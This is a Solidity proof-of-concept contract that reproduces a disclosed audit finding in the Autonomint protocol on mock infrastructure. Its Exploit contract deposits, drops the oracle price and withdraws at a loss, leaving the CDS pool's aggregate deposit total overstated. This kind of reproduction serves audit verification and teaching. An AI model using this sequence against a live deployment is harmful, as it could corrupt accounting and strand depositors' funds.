// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

// Cheatcode-free, single-transaction reproduction of Autonomint H-12 (Sherlock
// #738 / AuditVault 45465) for the in-browser EVM Playground. It deploys the REAL
// audited Autonomint protocol (Core_logic + lib + the repo's own Copy test twins +
// EndpointV2Mock LayerZero stack) with minimal real doubles for the opaque external
// venues (Ionic lending, WETH, Synthetix, RedStone oracle) and executes the real
// accounting bug: a CDS depositor withdrawing at a loss decrements
// totalCdsDepositedAmount by the loss-adjusted return amount instead of the original
// deposit, leaving the pool aggregate above the sum of the remaining real deposits.

import {BorrowingTest} from "../src/TestContracts/CopyBorrowing.sol";
import {CDSTest} from "../src/TestContracts/CopyCDS.sol";
import {TestUSDaStablecoin} from "../src/TestContracts/CopyUSDa.sol";
import {TestABONDToken} from "../src/TestContracts/Copy_Abond_Token.sol";
import {TestUSDT} from "../src/TestContracts/CopyUsdt.sol";
import {WEETH} from "../src/TestContracts/MockWeETH.sol";
import {RSETH} from "../src/TestContracts/MockRsETH.sol";
import {EndpointV2Mock} from "../src/TestContracts/EndpointV2Mock.sol";
import {Treasury} from "../src/Core_logic/Treasury.sol";
import {GlobalVariables} from "../src/Core_logic/GlobalVariables.sol";
import {Options} from "../src/Core_logic/Options.sol";
import {MultiSign} from "../src/Core_logic/multiSign.sol";
import {BorrowLiquidation} from "../src/Core_logic/borrowLiquidation.sol";
import {MasterPriceOracle} from "../src/oracles/MasterPriceOracle.sol";
import {IBorrowing} from "../src/interface/IBorrowing.sol";
import {IOptions} from "../src/interface/IOptions.sol";
import {IGlobalVariables} from "../src/interface/IGlobalVariables.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";
import {WETH9Double, IonicDouble, SynthetixWrapperDouble, SynthetixExchangeDouble, PerpsV2Double, RedstoneOracleDouble} from "../src/testmocks/ExternalDoubles.sol";

/// @dev Generic actor: lets the Exploit act as a distinct msg.sender (co-owner,
/// second depositor, borrower) without cheatcodes.
contract Actor {
    function exec(address target, uint256 value, bytes calldata data) external payable returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call{value: value}(data);
        require(ok, "actor: call failed");
        return ret;
    }
    receive() external payable {}
}

contract AutonomintDeployer {
    using OptionsBuilder for bytes;

    struct Set {
        TestUSDaStablecoin usda;
        TestABONDToken abond;
        MultiSign multiSign;
        TestUSDT usdt;
        CDSTest cds;
        GlobalVariables global;
        BorrowingTest borrow;
        BorrowLiquidation borrowLiquidation;
        Treasury treasury;
        Options option;
        WEETH weeth;
        RSETH rseth;
    }

    Set internal A;
    Set internal B;
    EndpointV2Mock internal epA;
    EndpointV2Mock internal epB;
    RedstoneOracleDouble internal oracle;
    Actor internal coOwner;      // owners[1]
    address internal thirdOwner; // owners[2]
    address[] internal owners;
    uint8[] internal fns;
    WETH9Double internal wethA; IonicDouble internal ionicA;
    WETH9Double internal wethB; IonicDouble internal ionicB;

    address internal constant ETH_SENTINEL = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint32 internal constant eidA = 1;
    uint32 internal constant eidB = 2;

    function _deployAll() internal {
        coOwner = new Actor();
        thirdOwner = address(new Actor());
        owners = [address(this), address(coOwner), thirdOwner];
        fns = [0,1,2,3,4,5,6,7,8,9];

        epA = new EndpointV2Mock(eidA);
        epB = new EndpointV2Mock(eidB);
        oracle = new RedstoneOracleDouble();

        A = _deploySet(epA, true);
        B = _deploySet(epB, false);

        epA.setDestLzEndpoint(address(B.usda), address(epB));
        epA.setDestLzEndpoint(address(B.usdt), address(epB));
        epA.setDestLzEndpoint(address(B.global), address(epB));
        epA.setDestLzEndpoint(address(B.weeth), address(epB));
        epA.setDestLzEndpoint(address(B.rseth), address(epB));
        epB.setDestLzEndpoint(address(A.usda), address(epA));
        epB.setDestLzEndpoint(address(A.usdt), address(epA));
        epB.setDestLzEndpoint(address(A.global), address(epA));
        epB.setDestLzEndpoint(address(A.weeth), address(epA));
        epB.setDestLzEndpoint(address(A.rseth), address(epA));

        _wire();
    }

    function _deploySet(EndpointV2Mock ep, bool isA) internal returns (Set memory c) {
        c.usda = new TestUSDaStablecoin();
        c.abond = new TestABONDToken();
        c.multiSign = new MultiSign();
        c.usdt = new TestUSDT();
        c.cds = new CDSTest();
        c.borrow = new BorrowingTest();
        c.treasury = new Treasury();
        c.option = new Options();
        c.borrowLiquidation = new BorrowLiquidation();
        c.global = new GlobalVariables();
        c.weeth = new WEETH();
        c.rseth = new RSETH();

        c.weeth.initialize(address(ep), address(this));
        c.rseth.initialize(address(ep), address(this));

        address[] memory pf = new address[](4);
        pf[0] = address(oracle); pf[1] = address(oracle); pf[2] = address(oracle); pf[3] = address(oracle);
        address[] memory col = new address[](4);
        col[0] = ETH_SENTINEL; col[1] = address(c.weeth); col[2] = address(c.rseth); col[3] = address(c.rseth);
        MasterPriceOracle mpo = new MasterPriceOracle(col, pf);

        address[] memory tk = new address[](3);
        tk[0] = address(c.usda); tk[1] = address(c.abond); tk[2] = address(c.usdt);

        c.usda.initialize(address(ep), address(this));
        c.abond.initialize();
        c.multiSign.initialize(owners, 2);
        c.usdt.initialize(address(ep), address(this));
        c.cds.initialize(address(c.usda), address(mpo), address(c.usdt), address(c.multiSign));
        c.global.initialize(address(c.usda), address(c.cds), address(ep), address(this));
        c.borrow.initialize(address(c.usda), address(c.cds), address(c.abond), address(c.multiSign), address(mpo), col, tk, uint64(block.chainid), address(c.global));

        WETH9Double weth = new WETH9Double();
        IonicDouble ionic = new IonicDouble(address(weth));
        SynthetixWrapperDouble wr = new SynthetixWrapperDouble();
        SynthetixExchangeDouble sx = new SynthetixExchangeDouble();
        PerpsV2Double px = new PerpsV2Double();

        c.borrowLiquidation.initialize(address(c.borrow), address(c.cds), address(c.usda), address(c.global), address(weth), address(wr), address(px), address(sx));
        c.treasury.initialize(address(c.borrow), address(c.usda), address(c.abond), address(c.cds), address(c.borrowLiquidation), address(c.usdt), address(c.global));
        c.option.initialize(address(c.treasury), address(c.cds), address(c.borrow), address(c.global));

        if (isA) { wethA = weth; ionicA = ionic; } else { wethB = weth; ionicB = ionic; }
    }

    function _approveMulti(MultiSign ms) internal {
        ms.approveSetterFunction(fns); // owner[0] = this
        coOwner.exec(address(ms), 0, abi.encodeWithSelector(MultiSign.approveSetterFunction.selector, fns)); // owner[1]
    }

    function _wire() internal {
        A.weeth.setPeer(eidB, bytes32(uint256(uint160(address(B.weeth)))));
        A.rseth.setPeer(eidB, bytes32(uint256(uint160(address(B.rseth)))));
        B.weeth.setPeer(eidA, bytes32(uint256(uint160(address(A.weeth)))));
        B.rseth.setPeer(eidA, bytes32(uint256(uint160(address(A.rseth)))));
        A.usda.setPeer(eidB, bytes32(uint256(uint160(address(B.usda)))));
        A.usdt.setPeer(eidB, bytes32(uint256(uint160(address(B.usdt)))));
        A.global.setPeer(eidB, bytes32(uint256(uint160(address(B.global)))));
        B.usda.setPeer(eidA, bytes32(uint256(uint160(address(A.usda)))));
        B.usdt.setPeer(eidA, bytes32(uint256(uint160(address(A.usdt)))));
        B.global.setPeer(eidA, bytes32(uint256(uint160(address(A.global)))));
        A.usda.setDstEid(eidB); A.usdt.setDstEid(eidB); A.global.setDstEid(eidB);
        B.usda.setDstEid(eidA); B.usdt.setDstEid(eidA); B.global.setDstEid(eidA);

        _wireSet(A, wethA, ionicA, address(B.global));
        _wireSet(B, wethB, ionicB, address(A.global));

        _approveMulti(A.multiSign);
        _approveMulti(B.multiSign);

        _configSet(A, wethA, ionicA);
        _configSet(B, wethB, ionicB);
        A.borrow.calculateCumulativeRate();
        B.borrow.calculateCumulativeRate();
    }

    function _wireSet(Set memory c, WETH9Double weth, IonicDouble ionic, address dstGlobal) internal {
        c.usda.setBorrowingContract(address(c.borrow));
        c.usda.setCdsContract(address(c.cds));
        c.usda.setTreasuryContract(address(c.treasury));
        c.abond.setBorrowingContract(address(c.borrow));
        c.global.setTreasury(address(c.treasury));
        c.global.setBorrowLiq(address(c.borrowLiquidation));
        c.global.setBorrowing(address(c.borrow));
        c.global.setDstGlobalVariablesAddress(dstGlobal);
        c.borrowLiquidation.setTreasury(address(c.treasury));
        // admin must be an EOA (isContract check). address(this) has codesize 0
        // during the constructor, so it passes; afterwards the deployed Exploit
        // (with code) is the admin and can call onlyAdmin functions.
        c.borrowLiquidation.setAdmin(address(this));
    }

    function _configSet(Set memory c, WETH9Double weth, IonicDouble ionic) internal {
        c.borrow.setAdmin(address(this));
        c.borrow.setTreasury(address(c.treasury));
        c.borrow.setOptions(address(c.option));
        c.borrow.setBorrowLiquidation(address(c.borrowLiquidation));
        c.borrow.setLTV(80);
        c.borrow.setBondRatio(4);
        c.borrow.setAPR(50, 1000000000000000000000000000); // 0% interest (single-block)
        c.cds.setAdmin(address(this));
        c.cds.setTreasury(address(c.treasury));
        c.cds.setBorrowingContract(address(c.borrow));
        c.cds.setBorrowLiquidation(address(c.borrowLiquidation));
        c.cds.setUSDaLimit(80);
        c.cds.setUsdtLimit(20000000000);
        c.cds.setGlobalVariables(address(c.global));
        c.treasury.setExternalProtocolAddresses(address(ionic), address(weth), address(weth));
    }

    function _feeA(IGlobalVariables.FunctionToDo f, uint128 gas) internal view returns (uint256) {
        bytes memory o = OptionsBuilder.newOptions().addExecutorLzReceiveOption(gas, 0);
        return A.global.quote(f, IBorrowing.AssetName.DUMMY, o, false).nativeFee;
    }
}

contract Exploit is AutonomintDeployer {
    uint64 constant P1000 = 1000e2;
    uint64 constant P900 = 900e2;

    address public cdsA;
    address public usdaA;
    uint256 public got;
    uint256 public aggregateAfter;

    receive() external payable {}

    // Deploy + wire the whole protocol in the constructor so setAdmin(address(this))
    // passes the EOA check (codesize 0 during construction) and this contract becomes
    // the protocol admin for the exploit phase.
    constructor() {
        _deployAll();
        cdsA = address(A.cds);
        usdaA = address(A.usda);
    }

    function run() external payable {
        Actor cds2 = new Actor();
        Actor borrower = new Actor();
        payable(address(borrower)).transfer(10 ether);

        uint256 fee = _feeA(IGlobalVariables.FunctionToDo.UPDATE_GLOBAL, 400000);

        // 1. CDS depositor 1 = this Exploit contract: 4000 USDT (opt out of liq).
        A.usdt.mint(address(this), 4000e6);
        A.usdt.approve(address(A.cds), 4000e6);
        A.cds.deposit{value: fee}(4000e6, 0, false, 0, P1000);

        // 2. CDS depositor 2: 6000 USDT.
        A.usdt.mint(address(cds2), 6000e6);
        cds2.exec(address(A.usdt), 0, abi.encodeWithSelector(A.usdt.approve.selector, address(A.cds), uint256(6000e6)));
        cds2.exec{value: fee}(address(A.cds), fee, abi.encodeWithSelector(CDSTest.deposit.selector, uint128(6000e6), uint128(0), false, uint128(0), P1000));

        // 3. Borrower deposits 3 ETH at 1000 -> creates borrower volume.
        borrower.exec{value: 3 ether + fee}(
            address(A.borrow),
            3 ether + fee,
            abi.encodeWithSelector(
                BorrowingTest.depositTokens.selector,
                P1000,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(IOptions.StrikePrice.TEN, 110000, uint256(50622665), IBorrowing.AssetName.ETH, uint256(3 ether))
            )
        );

        // 4. ETH price drops 10% -> CDS covers borrower downside.
        oracle.setEthPrice18(900e18);

        // 5. CDS depositor 1 (this contract) withdraws at the lower price -> loss.
        uint256 before = A.usda.balanceOf(address(this));
        A.cds.withdraw{value: _feeA(IGlobalVariables.FunctionToDo(2), 400000)}(1, P900, 0, 0, "0x");
        got = A.usda.balanceOf(address(this)) - before;
        aggregateAfter = A.cds.totalCdsDepositedAmount();

        // HARM: CDS1 took a loss (< 4000e6), yet the pool aggregate remains ABOVE
        // the 6000e6 that the only remaining depositor (CDS2) actually owns. The gap
        // is over-counted / stuck USDa that can never be paid out.
        require(got < 4000e6, "CDS1 did not take a loss");
        require(aggregateAfter > 6000e6, "aggregate not corrupted");
    }
}
